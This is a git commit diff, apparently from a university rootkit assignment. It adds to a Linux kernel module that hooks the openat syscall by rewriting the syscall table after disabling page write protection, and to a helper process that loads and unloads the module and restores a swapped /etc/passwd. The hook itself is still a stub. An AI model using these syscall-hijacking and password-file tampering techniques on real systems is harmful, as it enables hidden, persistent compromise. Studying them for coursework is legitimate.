f65caa5c74d36242e8354e6f630f3d612026d69f
xz353 <xz353>
2023-04-29 20:38:32 -0400

    asdad

--- project-5/sneaky_mod.c
+++ project-5/sneaky_mod.c
@@ -1,34 +1,38 @@
-#include <linux/module.h>      // for all modules 
-#include <linux/init.h>        // for entry/exit macros 
-#include <linux/kernel.h>      // for printk and other kernel bits 
-#include <asm/current.h>       // process information
-#include <linux/sched.h>
-#include <linux/highmem.h>     // for changing page permissions
-#include <asm/unistd.h>        // for system call constants
-#include <linux/kallsyms.h>
-#include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <asm/current.h>  // process information
+#include <asm/page.h>
+#include <asm/unistd.h>     // for system call constants
+#include <linux/highmem.h>  // for changing page permissions
+#include <linux/init.h>     // for entry/exit macros
+#include <linux/kallsyms.h>
+#include <linux/kernel.h>  // for printk and other kernel bits
+#include <linux/module.h>  // for all modules
+#include <linux/moduleparam.h>
+#include <linux/sched.h>
+#include <sys/types.h>
 
 #define PREFIX "sneaky_process"
 
 //This is a pointer to the system call table
-static unsigned long *sys_call_table;
+static unsigned long * sys_call_table;
+static pid_t pid = 0;
+module_param(pid, pid_t, 0);
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
-int enable_page_rw(void *ptr){
+int enable_page_rw(void * ptr) {
   unsigned int level;
-  pte_t *pte = lookup_address((unsigned long) ptr, &level);
-  if(pte->pte &~_PAGE_RW){
-    pte->pte |=_PAGE_RW;
+  pte_t * pte = lookup_address((unsigned long)ptr, &level);
+  if (pte->pte & ~_PAGE_RW) {
+    pte->pte |= _PAGE_RW;
   }
   return 0;
 }
 
-int disable_page_rw(void *ptr){
+int disable_page_rw(void * ptr) {
   unsigned int level;
-  pte_t *pte = lookup_address((unsigned long) ptr, &level);
-  pte->pte = pte->pte &~_PAGE_RW;
+  pte_t * pte = lookup_address((unsigned long)ptr, &level);
+  pte->pte = pte->pte & ~_PAGE_RW;
   return 0;
 }
 
@@ -38,18 +42,15 @@ int disable_page_rw(void *ptr){
 asmlinkage int (*original_openat)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
-asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
-{
+asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
   // Implement the sneaky part here
   return (*original_openat)(regs);
 }
 
 // The code that gets executed when the module is loaded
-static int initialize_sneaky_module(void)
-{
+static int initialize_sneaky_module(void) {
   // See /var/log/syslog or use `dmesg` for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
-
   // Lookup the address for this symbol. Returns 0 if not found.
   // This address will change after rebooting due to protection
   sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
@@ -58,24 +59,22 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
-  
+
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
-  
+
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
 
   // You need to replace other system calls you need to hack here
-  
+
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 
-  return 0;       // to show a successful load 
-}  
+  return 0;  // to show a successful load
+}
 
-
-static void exit_sneaky_module(void) 
-{
-  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+static void exit_sneaky_module(void) {
+  printk(KERN_INFO "Sneaky module being unloaded.\n");
 
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
@@ -85,10 +84,9 @@ static void exit_sneaky_module(void)
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
 
   // Turn write protection mode back on for sys_call_table
-  disable_page_rw((void *)sys_call_table);  
-}  
+  disable_page_rw((void *)sys_call_table);
+}
 
-
-module_init(initialize_sneaky_module);  // what's called upon loading 
-module_exit(exit_sneaky_module);        // what's called upon unloading  
+module_init(initialize_sneaky_module);  // what's called upon loading
+module_exit(exit_sneaky_module);        // what's called upon unloading
 MODULE_LICENSE("GPL");
--- project-5/sneaky_process.c
+++ project-5/sneaky_process.c
@@ -11,9 +11,32 @@ void recover_etc_passwd() {
   system("mv /tmp/passwd /etc/passwd");
 }
 
+void load_module(pid_t pid) {
+  char str[100];
+  sprintf(str, "insmod sneaky_mod.ko pid=%d\n", pid);
+  fprintf(stdout, "load module: %s", str);
+  system(str);
+}
+
+void rm_module() {
+  fprintf(stdout, "unload module\n");
+  system("rmmod sneaky_mod.ko");
+}
+
+void listen_q() {
+  int input = 0;
+  for (; (input = getchar()) != 'q';) {
+  }
+  fprintf(stdout, "receive q from keyboard, quit\n");
+}
+
 int main() {
-  fprintf(stdout, "sneaky_process pid = %d\n", getpid());
+  pid_t pid = getpid();
+  fprintf(stdout, "sneaky_process pid = %d\n", pid);
   etc_passwd2();
+  load_module(pid);
+  listen_q();
+  rm_module();
   recover_etc_passwd();
   return EXIT_SUCCESS;
 }
